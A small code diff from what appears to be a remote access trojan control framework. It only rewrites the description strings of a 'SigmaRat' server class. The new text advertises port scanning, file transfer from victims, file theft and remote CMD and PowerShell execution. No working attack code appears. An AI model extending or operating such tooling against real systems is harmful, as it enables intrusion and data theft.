@@ -54,7 +54,7 @@ class GypsyKing(AdvTemplate):
 
 class SigmaRat(AdvTemplate):
     SERV_TYPE = "SigmaRat"
-    SERV_INFO = "Server to handle multiple Sigma Rat connection."
-    WORM_INFO = "Runs in background."
+    SERV_INFO = "Server to handle multiple Sigma Rat connection. It has many features such as a port scanner, loading and downloading files from the client, executing commands, scripts, etc."
+    WORM_INFO = "PiRat runs in background. Can scan ports on target server, search and robber multiple files. Execute CMD and PS command, PS script etc."
     def __init__(self, ctrl_pipe: Pipe, conf: dict = {}, controlers=RatControler):
         super().__init__(ctrl_pipe=ctrl_pipe, conf=conf, controlers=controlers)
